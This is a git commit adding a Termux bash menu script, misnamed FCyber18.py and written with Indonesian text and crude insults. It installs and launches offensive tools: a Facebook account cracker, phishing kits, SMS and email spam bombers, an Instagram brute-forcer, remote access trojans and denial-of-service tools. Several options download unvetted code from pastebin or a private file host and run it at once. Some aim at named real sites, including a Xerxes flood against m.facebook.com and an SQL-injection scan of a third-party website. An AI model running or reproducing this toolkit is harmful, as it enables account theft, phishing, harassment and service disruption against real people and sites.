0d165e5d237135dfe042ef5065843e14a6621e72
0FoxCyber0 <41130749+0FoxCyber0@users.noreply.github.com>
2018-07-11 22:54:12 +0000

    Create FCyber18.py

---
+++ FCyber18.py
@@ -0,0 +1,1421 @@
+#!/system/xbin/bash
+
+#Kesini Lu Ngapain Tod
+
+#Mau Recode Pm Gua Bangsad_-
+
+clear
+
+cd module
+
+python2 kentod.py
+
+blue='\033[34;1m'
+
+green='\033[32;1m' 
+
+purple='\033[35;1m'
+
+cyan='\033[36;1m'
+
+red='\033[31;1m'
+
+white='\033[37;1m'
+
+yellow='\033[33;1m'
+
+sleep 1
+
+echo "\033[33;1m~========================~"
+
+sleep 1
+
+echo "\033[32;1m| Creator : Mr.KOVLAK.Jr |"
+
+sleep 1
+
+echo "\033[34;1m| Contact : 085848812535 |"
+
+sleep 1
+
+echo "\33[32;1m| Thanks To All Member   |"
+
+sleep 1
+
+echo "\033[34;1m|    FOX CYBER TEAM      |"
+
+sleep 1
+
+echo "\33[32;1m|        Website         |"
+
+echo "\033[33;1m~========================~"
+
+sleep 1
+
+echo ""
+
+echo "\033[32;1mSilahkan Pilih Yang Mau Di Eue"
+
+echo "\033[36;1m"
+
+echo $green "1• Install Hack Facebook ~MBF~"
+
+echo $purple "2• Install Layzmux"
+
+echo $green "3• Install LITE SPAM"
+
+echo $purple "4• Install WEEMAN"
+
+echo $green "5• Install Hunner framework"
+
+echo $purple "6• Install SQLMAP"
+
+echo $green "7• Install Metasploit"
+
+echo $purple "8• Spam Tsel"
+
+echo $green "9• Santet Online"
+
+echo $purple "10• InstaHACK"
+
+echo $green "11• Install Torshamer"
+
+echo $purple "12• Webdav Buat Deface"
+
+echo $green "13• Auto React Facebook"
+
+echo $purple "14• IpGeoLocation"
+
+echo $green "15• Install Red Hawk"
+
+echo $purple "16• Install RouterSploit"
+
+echo $green "17• Install Admin Finder"
+
+echo $purple "18• Spam Boom Mall"
+
+echo $green "19• Spammer Sms Grab"
+
+echo $purple "20• Install HAKKU"
+
+echo $green "21• Install viSQL"
+
+echo $purple "22• Install Hash Buster"
+
+echo $green "23• Tool Ubuntu"
+
+echo $purple "24• Tool Daijobu"
+
+echo $green "25• Tool B4J1N64Nv6"
+
+echo $purple "26• Install Xerxes"
+
+echo $green "27• Nuyul Bitcoin"
+
+echo $purple "28• Mulung Bitcoin"
+
+echo $green "29• install errorcybertools"
+
+echo $purple "30• Lihat Spesifikasi Ponsel"
+
+echo $green "31• Install Instagram Bot"
+
+echo $purple "32• Install 4wsectools"
+
+echo $green "33• Install txtool"
+
+echo $purple "34• Menstabilkan Jaringan Mode 1"
+
+echo $green "35• Menstabilkan Jaringan Mode 2"
+echo $purple "36• Full Bot Facebook"
+
+echo $green "37• Install tools diejoubu"
+
+echo $purple "38• Install Termux-A"
+
+echo $green "39• install A-Rat"
+
+echo $purple "40• Install Ipddos"
+
+echo $green "41• Install Black-Hydra"
+
+echo $purple "42• Install SocialFish"
+
+echo $green "43• Install Ko-Dork"
+
+echo $purple "44• Install Kali Ubuntu"
+
+echo $green "45• Install Ngrok"
+
+echo $purple "46• Install Lokomedia Exploiters"
+
+echo $green "47• Install Fucking-Rat"
+
+echo $purple "48• Install VulnScaner"
+
+echo $green "49• Install linux fedora"
+
+echo $purple "50• Hecker Recondog"
+
+echo $green "00• Keluar"
+
+echo "\033[32;1m"
+
+read -p "÷÷÷[Masukan Kontlonya Disamping]÷÷÷ " kentod
+
+if [ $kentod = 1 ] || [ $kentod = 1 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update&&apt upgrade
+
+pkg install python2
+
+pip2 install mechanize
+
+pkg install git
+
+git clone https://github.com/pirmansx/mbf
+
+cd mbf
+
+python2 MBF.py
+
+fi
+
+if [ $kentod = 2 ] || [ $kentod = 2 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update&&apt upgrade
+
+apt install git
+
+apt install python
+
+apt install python2
+
+git clone https://github.com/Gameye98/Lazymux.git
+
+cd Lazymux
+
+python2 lazymux.py
+
+fi
+
+if [ $kentod = 3 ] || [ $kentod = 3 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install php
+
+pkg install toilet
+
+pkg install sh
+
+pkg install git
+
+git clone https://github.com/4L13199/LITESPAM
+
+cd LITESPAM
+
+sh LITESPAM.sh
+
+fi
+
+
+if [ $kentod = 4 ] || [ $kentod = 4 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update&&apt upgrade
+
+apt install git
+
+apt install python2
+
+git clone https://github.com/evait-security/weeman
+
+cd weeman
+
+chmod 777 weeman.py
+
+python2 weeman.py
+
+fi
+
+
+if [ $kentod = 5 ] || [ $kentod = 5 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update
+
+apt install python
+
+apt install git -y
+
+git clone https://github.com/b3-v3r/Hunner
+
+cd Hunner 
+
+chmod 777 hunner.py
+
+python hunner.py
+
+fi
+
+
+if [ $kentod = 6 ] || [ $kentod = 6 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update
+
+apt install python
+
+apt install python2
+
+apt install git
+
+git clone https://github.com/sqlmapproject/sqlmap
+
+cd sqlmap
+
+Python2 sqlmap.py
+
+fi
+
+if [ $kentod = 7 ] || [ $kentod = 7 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update&&apt upgrade
+
+apt install git
+
+apt install wget
+
+wget https://raw.githubusercontent.com/verluchie/termux-metasploit/master/install.sh
+
+chmod 777 install.sh
+
+sh install.sh
+
+fi
+
+if [ $kentod = 8 ] || [ $kentod = 8 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install curl 
+
+pkg install php 
+
+curl -s http://files-store.theprivat.ml/uploads/bombtsel.txt > bombtsel.php 
+
+chmod 777 bombtsel.php
+
+php bombtsel.php
+
+
+fi
+
+if [ $kentod = 9 ] || [ $kentod = 9 ]
+
+then
+
+clear
+
+sleep 1
+
+apt install python2
+
+git clone https://github.com/Gameye98/santet-online
+
+cd santet-online
+
+python2 santet.py
+
+
+fi
+
+if [ $kentod = 10 ] || [ $kentod = 10 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install python
+
+pkg install git
+
+git clone https://github.com/avramit/instahack
+
+cd instahack
+
+chmod +x hackinsta.py
+
+pip install -r pass.txt
+
+pip install -r password.txt
+
+pip install -r pasa.txt 
+
+python hackinsta.py
+
+fi
+
+if [ $kentod = 11 ] || [ $kentod = 11 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install git
+
+apt install tor
+
+pkg install python2
+
+git clone https://github.com/dotfighter/torshammer.git
+
+cd torshammer
+
+python2 torshammer.py
+
+fi
+
+if [ $kentod = 12 ] || [ $kentod = 12 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update&&upgrade
+
+apt install python2
+
+pip2 install urllib3 chardet certifi idna requests
+
+apt install openssl curl
+
+pkg install libcurl
+
+ln -s /sdcard
+
+cd sdcard
+
+mkdir webdav
+
+cd webdav
+
+curl -k -O https://pastebin.com/raw/HnVyQPtR
+
+mv HnVyQPtR webdav.py 
+
+python2 webdav.py
+
+fi
+
+if [ $kentod = 13 ] || [ $kentod = 13 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update&&apt upgrade
+
+apt install git
+
+apt install php
+
+apt install curl
+
+git clone https://github.com/AMVengeance/FB-React.git
+
+cd FB-React
+
+chmod +x start
+
+./start
+
+fi
+
+if [ $kentod = 14 ] || [ $kentod = 14 ]
+
+then
+
+clear
+
+sleep 1
+
+apt-get update&&apt-get upgrade
+
+apt-get install git
+
+apt install python
+
+git clone https://github.com/maldevel/IPGeolocation.git
+
+cd IPGeolocation
+
+chmod +x ipgeolocation.py
+
+pip install -r requirements.txt
+
+python ipgeolocation.py
+
+fi
+
+if [ $kentod = 15 ] || [ $kentod = 15 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update
+
+apt install php
+
+apt install git
+
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+
+cd RED_HAWK
+
+chmod +x rhawk.php
+
+php rhawk.php
+
+
+fi
+
+if [ $kentod = 16 ] || [ $kentod = 16 ]
+
+then
+
+clear
+
+sleep 1
+
+apt install git
+
+apt install python2
+
+pip2 install requests
+
+git clone https://github.com/reverse-shell/routersploit.git
+
+cd routersploit
+
+pip install -r requirements.txt
+
+termux-fix-shebang rsf.py
+
+cd ~/
+
+fi
+
+if [ $kentod = 17 ] || [ $kentod = 17 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update&&apt upgrade
+
+apt install git
+
+apt install python2
+
+git clone  https://github.com/the-c0d3r/admin-finder.git
+
+cd admin-finder
+
+python2 admin-finder.py
+
+fi
+
+if [ $kentod = 18 ] || [ $kentod = 18 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install update&&pkg install upgrade
+
+pkg install wget
+
+pkg install php
+
+wget http://files-store.theprivat.ml/uploads/bom-mall.zip
+
+unzip bom-mall.zip
+
+cd bom-mall
+
+php run.php
+
+
+fi
+
+if [ $kentod = 19 ] || [ $kentod = 19 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install python2 
+
+pip2 install requests 
+
+pkg install git 
+
+git clone https://github.com/p4kl0nc4t/Spammer-Grab
+
+cd Spammer-Grab 
+
+chmod +x spammer.py 
+
+python2 spammer.py
+
+
+fi
+
+if [ $kentod = 20 ] || [ $kentod = 20 ]
+
+then
+
+clear
+
+sleep 1
+
+apt install python
+
+apt install git
+
+mkdir vasu
+
+git clone https://github.com/4shadoww/hakkuframework
+
+cd hakkuframework
+
+chmod +x hakku
+
+python hakku
+
+show modules
+
+use whois
+
+show options
+
+set target examplesite.com
+
+run
+
+fi
+
+if [ $kentod = 21 ] || [ $kentod = 21 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update
+
+apt install python2
+
+apt install git
+
+git clone https://github.com/blackvkng/viSQL
+
+cd viSQL
+
+python2 -m pip install -r requirements.txt
+
+python2 viSQL.py
+
+python2 viSQL.py -t http://www.bible-history.com
+
+fi
+
+if [ $kentod = 22 ] || [ $kentod = 22 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update
+
+apt upgrade
+
+apt install python2
+
+apt install git
+
+git clone https://github.com/UltimateHackers/Hash-Buster
+
+cd Hash-Buster
+
+python2 hash.py
+
+fi
+
+if [ $kentod = 23 ] || [ $kentod = 23 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update
+
+apt install git
+
+apt install wget
+
+apt install proot
+
+git clone https://github.com/Neo-Oli/termux-ubu&#8230;
+
+cd termux-ubuntu
+
+chmod +x ubuntu.sh
+
+./ubuntu.sh
+
+./start.sh
+
+fi
+
+if [ $kentod = 24 ] || [ $kentod = 24 ]
+
+then
+
+clear
+
+sleep 1
+
+apt upgrade && apt update 
+
+apt install php 
+
+apt install git 
+
+git clone https://github.com/alintamvanz/diejoubu 
+
+cd diejoubu 
+
+cd v1.2 
+
+php diejoubu.php
+
+fi
+
+if [ $kentod = 25 ] || [ $kentod = 25 ]
+
+then
+
+clear
+
+sleep 1
+
+apt upgrade && apt update 
+
+apt install php 
+
+apt install git 
+
+git clone https://github.com/DarknessCyberTeam/BAJINGANv6/
+
+cd BAJINGANv6
+
+sh BAJINGAN.sh
+
+fi
+
+if [ $kentod = 26 ] || [ $kentod = 26 ]
+
+then
+
+clear
+
+sleep 1
+
+apt install git 
+
+apt install clang 
+
+git clone https://github.com/zanyarjamal/xerxes 
+
+ls 
+
+cd xerxes 
+
+ls 
+
+clang xerxes.c -o xerxes 
+
+ls 
+
+./xerxes m.facebook.com 80 
+
+fi
+
+if [ $kentod = 27 ] || [ $kentod = 27 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install php
+
+pkg install wget
+
+wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL
+
+mv tuyul.php $HOME
+
+php $HOME/tuyul.php
+
+fi
+
+if [ $kentod = 28 ] || [ $kentod = 28 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install python
+
+pkg install git
+
+pkg install php
+
+git clone https://github.com/Cvar1984/pemulungBTC.git
+
+mv pemulungBTC $HOME
+
+cd $HOME/pemulungBTC
+
+php autoload.php
+
+php mulung.php
+
+fi
+
+if [ $kentod = 29 ] || [ $kentod = 29 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install git
+
+git clone https://github.com/MrKeepSmile/errorcybertool.git
+
+mv errorcybertool $HOME
+
+cd $HOME/errorcybertool
+
+chmod 777 errorcyber
+
+./errorcyber
+
+fi
+
+if [ $kentod = 30 ] || [ $kentod = 30 ]
+
+then
+
+clear
+
+sleep 1
+
+toilet -f standard -F gay "Mr.KOVLAK"
+
+pkg install neofetech
+
+neofetech
+
+fi
+
+if [ $kentod = 31 ] || [ $kentod = 31 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update 
+
+apt upgrade
+
+apt install git
+
+apt install python2
+
+git clone https://github.com/verluchie/instabot.py
+
+mv instabot.py $HOME
+
+cd $HOME/instabot.py
+
+pip2 install -r requirements.txt
+
+python2 example.py
+
+fi
+
+if [ $kentod = 32 ] || [ $kentod = 32 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update
+
+apt install git
+
+git clone https://github.com/aryanrtm/4wsectools
+
+mv 4wsectools $HOME
+
+cd $HOME/4wsectools
+
+chmod 777 tools
+
+./tools
+
+fi
+
+if [ $kentod = 33 ] || [ $kentod = 33 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install git
+
+git clone https://github.com/kuburan/txtool
+
+mv txtool $HOME
+
+cd $HOME/txtool
+
+python2 install.py
+
+python2 update.py
+
+txtool
+
+fi
+
+if [ $kentod = 34 ] || [ $kentod = 34 ]
+
+then
+
+clear
+
+sleep 2
+
+echo ""
+
+echo ""
+
+ping 8.8.8.8 
+
+fi
+
+if [ $kentod = 35 ] || [ $kentod = 35 ]
+
+then
+
+clear
+
+sleep 2
+
+echo ""
+
+echo ""
+
+ping -D www.google.com
+
+fi
+
+if [ $kentod = 36 ] || [ $kentod = 36 ]
+
+then
+
+clear
+
+sleep 1
+
+cd module
+
+python2 fbf.py
+
+fi
+
+if [ $kentod = 37 ] || [ $kentod = 37 ]
+
+then
+
+clear
+
+sleep 1
+
+apt install git
+
+apt install php
+
+git clone https://github.com/alintamvanz/diejoubu
+
+mv diejoubu $HOME
+
+cd $HOME/diejoubu
+
+cd v1.2
+
+php diejoubu.php
+
+fi
+
+if [ $kentod = 38 ] || [ $kentod = 38 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update && apt upgrade
+
+apt install termux-api
+
+apt install git
+
+apt install php
+
+git clone https://github.com/Cvar1984/Termux-A.git
+
+mv Termux-A $HOME
+
+cd $HOME/Termux-A
+
+php run.php
+
+fi
+
+if [ $kentod = 39 ] || [ $kentod = 39 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install git
+
+git clone https://github.com/Xi4u7/A-Rat.git
+
+mv A-Rat $HOME
+
+cd $HOME/A-Rat
+
+python2 A-Rat.py
+
+fi
+
+if [ $kentod = 40 ] || [ $kentod = 40 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update && apt upgrade
+
+apt install git
+
+apt install python
+
+apt install python2
+
+git clone https://github.com/CiKu370/ipddos.git
+
+mv ipddos $HOME
+
+cd $HOME/ipddos
+
+echo "[Ddos Pake Ip + port]"
+
+echo "[Contoh 127.x.x.x 8080]"
+
+read -p "[Masukan Ip dan port]=>:" target 
+
+python2 ipddos.py target 
+
+fi
+
+if [ $kentod = 41 ] || [ $kentod = 41 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update && apt upgrade
+
+apt install git
+
+apt install python
+
+apt install python2
+
+git clone https://github.com/Gameye98/Black-Hydra.git
+
+mv Black-Hydra $HOME
+
+cd $HOME/Black-Hydra
+
+python2 blackhydra.py
+
+fi
+
+if [ $kentod = 42 ] || [ $kentod = 42 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg install php
+
+pkg install python2
+
+pkg install git
+
+pkg install curl
+
+git clone https://github.com/Lexiie/SocialFish.git
+
+mv SocialFish $HOME
+
+cd $HOME/SocialFish
+
+pip2 install wget
+
+python2 SocialFish.py
+
+fi
+
+if [ $kentod = 43 ] || [ $kentod = 43 ]
+
+then
+
+clear
+
+sleep 1
+
+pkg update && pkg upgrade
+
+pkg install git 
+
+pkg install python2
+
+git clone https://github.com/ciku370/ko-dork.git
+
+mv ko-dork $HOME
+
+cd $HOME/ko-dork
+
+python2 dork.py
+
+fi
+
+if [ $kentod = 44 ] || [ $kentod = 44 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update && apt upgrade
+
+apt install git
+
+apt install wget
+
+apt install proot
+
+git clone https://github.com/Neo-Oli/termux-ubuntu.git
+
+mv termux-ubuntu $HOME
+
+cd $HOME/~/termux-ubuntu
+
+chmod +x ubuntu.sh
+
+sh ubuntu.sh
+
+fi
+
+if [ $kentod = 45 ] || [ $kentod = 45 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update && apt upgrade
+
+apt install wget
+
+mkdir ngrok
+
+cd ~/ngrok
+
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+
+mv ngrok-stable-linux-arm.zip $HOME
+
+$HOME/unzip ngrok-stable-linux-arm.zip
+
+cd ~/
+
+ls
+
+fi
+
+if [ $kentod = 46 ] || [ $kentod = 46 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update && apt upgrade
+
+pkg install php
+
+pkg install wget
+
+wget https://pastebin.com/raw/sPpJRjCZ -O lokomedia.php
+
+mv lokomedia.php $HOME
+
+cd
+
+php lokomedia.php 
+
+fi
+
+if [ $kentod = 47 ] || [ $kentod = 47 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update 
+
+apt upgrade
+
+apt install git
+
+apt install python2
+
+git clone https://github.com/kereh/Fucking-Rat
+
+mv Fucking-Rat $HOME
+
+cd $HOME/Fucking-Rat
+
+python2 fr.py
+
+fi
+
+if [ $kentod = 48 ] || [ $kentod = 48 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update 
+
+apt upgrade
+
+apt install git
+
+apt install python2
+
+git clone https://github.com/kereh/VulnScaner
+
+mv VulnScaner $HOME
+
+cd $HOME/VulnScaner
+
+python2 VulnScaner.py
+
+fi
+
+if [ $kentod = 49 ] || [ $kentod = 49 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update && apt upgrade
+
+apt-get install git
+
+apt install wget
+
+git clone https://github.com/nmilosev/termux-fedora.git
+
+mv termux-fedora $HOME
+
+cd $HOME/termux-fedora
+
+chmod +x termux-fedora.sh
+
+sh termux-fedora.sh
+
+fi
+
+if [ $kentod = 50 ] || [ $kentod = 50 ]
+
+then
+
+clear
+
+sleep 1
+
+apt update
+
+apt install python python2
+
+apt install git
+
+git clone https://github.com/UltimateHackers/ReconDog
+
+cd ReconDog
+
+chmod +x dog.py
+
+Python2 dog.py
+
+fi
+
+if [ $kentod = 00 ] || [ $kentod = 00 ]
+
+then
+
+clear
+
+echo "Selamat Jalan"
+
+sleep 1
+
+echo "Sampai Jumpa Lagi"
+
+sleep 1
+
+echo "3"
+
+sleep 1
+
+echo "2"
+
+sleep 1
+
+echo "1"
+
+sleep 1
+
+clear
+
+echo "Terhapus Bagaikan Kenangan Mantan"
+
+exit
+
+fi
+
